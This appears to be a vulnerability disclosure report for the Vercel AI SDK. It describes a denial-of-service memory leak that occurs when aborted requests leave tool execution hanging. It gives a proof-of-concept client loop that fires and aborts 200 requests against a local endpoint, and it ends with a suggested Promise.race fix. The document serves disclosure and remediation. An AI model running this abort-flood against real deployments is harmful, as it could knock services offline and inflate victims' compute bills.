# Denial of Service (OOM) via Unbounded Generator Retention in executeTool Async Boundary

**Target:** Vercel AI SDK (`@ai-sdk/core`)
**Weakness:** CWE-400: Uncontrolled Resource Consumption

## Summary
The AI SDK fails to enforce `AbortSignal` and `toolTimeoutMs` boundaries when awaiting user-space tool execution inside the `executeTool` async generator. If a client aborts a request while a tool is executing a hanging promise (e.g., waiting on a stalled external API), the SDK’s internal `TransformStream` permanently stalls. This orphans the generator frame, closure variables, and OpenTelemetry spans in the V8 heap, leading to a linear memory leak and eventual Denial of Service (OOM).

## Vulnerability Details
When the SDK executes a tool, it merges the client's `AbortSignal` with a configured `toolTimeoutMs`. It passes this merged signal to the developer's tool via the options object.

However, the SDK delegates the actual cancellation enforcement entirely to the developer's implementation. In `packages/provider-utils/src/types/execute-tool.ts`, the SDK yields the tool's result without a framework-level circuit breaker:

```typescript
// packages/provider-utils/src/types/execute-tool.ts
const result = tool.execute(input, options);
// ...
yield { type: 'final', output: await result }; // <-- BLOCKS INDEFINITELY
```

Because there is no `Promise.race` wrapping `await result`, if the tool's external dependency hangs and the promise never settles, the generator is suspended indefinitely.

Consequently, the `Promise.all` batch inside `execute-tools-from-stream.ts` never resolves. The `TransformStream` callback freezes, leaving stream readers locked. Because the microtask remains pending in the event loop, V8 cannot garbage collect the generator frame, the conversation history (messages), or the active OpenTelemetry tracing spans.

### Why this is a Framework Vulnerability (Not just Developer Error):

1. **Host Stability:** The framework's core stream pipeline and telemetry hooks should never permanently lock due to a stalled downstream dependency.
2. **Inconsistent Enforcement:** The SDK already uses a defensive `awaitPromiseWithAbortSignal` wrapper inside `parse-tool-call.ts` to protect against hanging model responses. Failing to apply this same pattern to tool execution is a missing architectural guardrail.
3. **Broken Timeout Contract (CWE-613):** The SDK explicitly exposes a `toolTimeoutMs` configuration, creating a security contract that the framework will halt execution if the threshold is exceeded. However, because the timeout is passed passively via an options object rather than enforced via a framework-level `Promise.race`, the setting is physically incapable of protecting the host if the developer's HTTP client drops the signal. A framework's internal pipeline stability cannot depend on user-space compliance.

## Impact
An unauthenticated attacker can trigger a tool known to query a slow or occasionally unresponsive external API, then immediately close their HTTP connection.

Because the SDK's execution loop permanently hangs, this causes severe cascading failures:

- **Memory Exhaustion (OOM):** OpenTelemetry spans and stream buffers accumulate in the V8 heap until the Node process crashes.
- **Serverless Concurrency Exhaustion:** In environments like Vercel Serverless Functions or AWS Lambda, the hanging microtask prevents the function invocation from terminating. Attackers can trivially exhaust the victim's maximum concurrent execution limits, taking the entire AI application offline.
- **Financial Sabotage:** Because the serverless functions hang until the platform's hard maximum timeout (e.g., 5 minutes on Vercel Pro), attackers can inflict massive compute billing spikes on the victim with minimal bandwidth.

## Steps to Reproduce (PoC)
1. Initialize a standard Next.js / AI SDK endpoint.
2. Define a mock tool that simulates a hanging external API call (a common failure mode for third-party endpoints):

```typescript
import { tool, streamText } from 'ai';
import { z } from 'zod';

const hangingTool = tool({
  description: 'Fetches user data from an external CRM.',
  parameters: z.object({ userId: z.string() }),
  execute: async ({ userId }) => {
    // REAL-WORLD MISTAKE: The developer makes a standard fetch call 
    // but forgets to wire up the { signal: abortSignal } parameter.
    // We simulate a hanging third-party API using a public delay service.
    const res = await fetch('https://httpstat.us/200?sleep=60000');
    return res.json();
  }
});
```

3. Create a client script that repeatedly calls this endpoint and immediately aborts the connection:

```javascript
async function triggerLeak() {
  for (let i = 0; i < 200; i++) {
    const controller = new AbortController();
    fetch('http://localhost:3000/api/chat', { 
      method: 'POST', 
      body: JSON.stringify({ prompt: 'Use the hanging tool.' }),
      signal: controller.signal 
    }).catch(() => {});
    
    // Abort immediately after the tool execution begins
    setTimeout(() => controller.abort(), 100); 
  }
}
triggerLeak();
```

**Observation:** Monitor the server via `process.memoryUsage().heapUsed` with `--expose-gc`. The heap size increases linearly with every aborted request and does not drop after `global.gc()`, proving the closure and OpenTelemetry span retention.

## Suggested Remediation
Apply the same defensive racing pattern already used in `parse-tool-call.ts`. Wrap the `executeTool` promise in a race against the merged abort signal so the generator can cleanly reject, unblock the stream, and allow V8 to sweep the memory:

```typescript
const resultPromise = tool.execute(input, options);
const output = await Promise.race([
  resultPromise,
  new Promise((_, reject) => {
    if (options.abortSignal?.aborted) {
      reject(options.abortSignal.reason);
    }
    options.abortSignal?.addEventListener('abort', () => {
      reject(options.abortSignal.reason);
    }, { once: true });
  })
]);
```
